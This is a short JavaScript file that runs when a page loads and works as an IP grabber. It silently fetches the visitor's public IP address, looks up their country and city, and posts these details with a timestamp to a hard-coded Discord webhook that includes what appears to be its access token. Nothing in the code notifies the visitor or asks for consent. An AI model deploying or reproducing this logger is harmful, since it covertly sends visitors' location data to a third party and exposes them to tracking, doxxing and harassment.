const sendIPToDiscord = async () => {
  try {
    // Fetch the user's IP address
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    // Fetch location information based on the IP address
    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
    const locationData = await locationResponse.json();
    const country = locationData.country_name;
    const city = locationData.city;
    const time = new Date().toLocaleString();

    // Discord webhook URL
    const webhookURL = 'https://discord.com/api/webhooks/1257763994517901464/WridnsUHPIktU1i8gA4nz9HuM4m6bWr8t4cJGorBPWjgqaByvXiFS_s5MoDI2g3zBNio';
    const payload = {
      embeds: [{
        title: 'User Location Information',
        description: `\n<@903262692335312946>\n` +
                     '```\nCountry: ' + country + '\n```' +
                     '```\nCity: ' + city + '\n```' +
                     '```\nTime: ' + time + '\n```' +
                     '```\nIP Address: ' + ip + '\n```',
        color: 0x008080
      }]
    };

    // Send the information to the Discord webhook
    await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    console.log('Data sent to Discord successfully.');
  } catch (error) {
    console.error('Error occurred: ', error);
  }
};

// Call sendIPToDiscord function when the page loads
sendIPToDiscord();
